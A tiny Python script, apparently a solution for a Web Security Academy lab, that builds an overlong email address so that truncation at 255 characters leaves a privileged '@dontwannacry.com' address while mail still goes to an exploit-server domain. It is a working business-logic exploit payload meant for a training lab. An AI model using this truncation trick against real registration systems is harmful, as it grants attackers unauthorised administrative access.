#!/bin/python3

email=".exploit-ac871f231ed60f3ac0543fc801e90073.web-security-academy.net"
admin="@dontwannacry.com"

payload='a'*(255-len(admin))+admin
print (payload)
print (len(payload))

print (payload+email)
print (len(payload+email))